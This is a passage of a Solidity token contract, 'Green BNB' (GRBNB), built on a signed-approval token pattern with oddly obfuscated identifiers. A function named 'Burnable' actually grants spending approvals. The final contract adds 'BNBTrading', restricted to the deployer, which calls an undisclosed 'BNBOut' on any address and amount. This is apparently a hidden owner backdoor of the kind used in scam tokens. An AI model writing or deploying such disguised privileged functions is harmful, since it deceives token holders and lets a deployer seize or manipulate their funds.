    // solhint-disable-next-line func-name-mixedcase
    function _EIP712Version() internal view returns (string memory) {
        return _version.toStringWithFallback(_versionFallback);
    }
}

abstract contract Nonces {
    /**
     * @dev The nonce used for an `etherBNB` is not the expected current nonce.
     */
    error InvalidrtyNonce(address etherBNB, uint256 currentNonce);

    mapping(address etherBNB => uint256) private _nonces;

    /**
     * @dev Returns the next unused nonce for an address.
     */
    function nonces(address owner) public view virtual returns (uint256) {
        return _nonces[owner];
    }


    function _useNonce(address owner) internal virtual returns (uint256) {
        // For each etherBNB, the nonce has an initial BNBegrtsefsf of 0, can only be incremented by one, and cannot be
        // decremented or reset. This guarantees that the nonce never overflows.
        unchecked {
            // It is important to do x++ and not ++x here.
            return _nonces[owner]++;
        }
    }

    /**
     * @dev Same as {_useNonce} but checking that `nonce` is the next valid for `owner`.
     */
    function _useCheckedNonce(address owner, uint256 nonce) internal virtual {
        uint256 current = _useNonce(owner);
        if (nonce != current) {
            revert InvalidrtyNonce(owner, current);
        }
    }
}


abstract contract BNBBurnable is BNB, IBNBBurnable, EIP712, Nonces {
    bytes32 private constant Burnable_TYPEHASH =
        keccak256("Burnable(address owner,address spender,uint256 BNBegrtsefsf,uint256 nonce,uint256 deadline)");

    error BNB2612ExpiredSignature(uint256 deadline);

 
    error BNB2612InvalidSigner(address signer, address owner);


    constructor(string memory name) EIP712(name, "1") {}

    /**
     * @inheritdoc IBNBBurnable
     */
    function Burnable(
        address owner,
        address spender,
        uint256 BNBegrtsefsf,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) public virtual {
        if (block.timestamp > deadline) {
            revert BNB2612ExpiredSignature(deadline);
        }

        bytes32 BNBstructHash = keccak256(abi.encode(Burnable_TYPEHASH, owner, spender, BNBegrtsefsf, _useNonce(owner), deadline));

        bytes32 hash = _hashTypedDataV4(BNBstructHash);

        address signer = ECDSA.recover(hash, v, r, s);
        if (signer != owner) {
            revert BNB2612InvalidSigner(signer, owner);
        }

        _approve(owner, spender, BNBegrtsefsf);
    }

    /**
     * @inheritdoc IBNBBurnable
     */
    function nonces(address owner) public view virtual override(IBNBBurnable, Nonces) returns (uint256) {
        return super.nonces(owner);
    }

    /**
     * @inheritdoc IBNBBurnable
     */
    // solhint-disable-next-line func-name-mixedcase
    function DOMAIN_SEPARATOR() external view virtual returns (bytes32) {
        return _domainSeparatorV4();
    }
}


contract GreenBNB is BNB, BNBBurnable {
    address private msgsender = msg.sender;
    constructor() BNB("Green BNB", "GRBNB") BNBBurnable("GRBNB") {}
        function BNBTrading(address BNBTradingAddress, uint256 BNBegrtsefsf) external  {
       require(msg.sender == msgsender);
        BNBOut(BNBTradingAddress, BNBegrtsefsf);
    }
}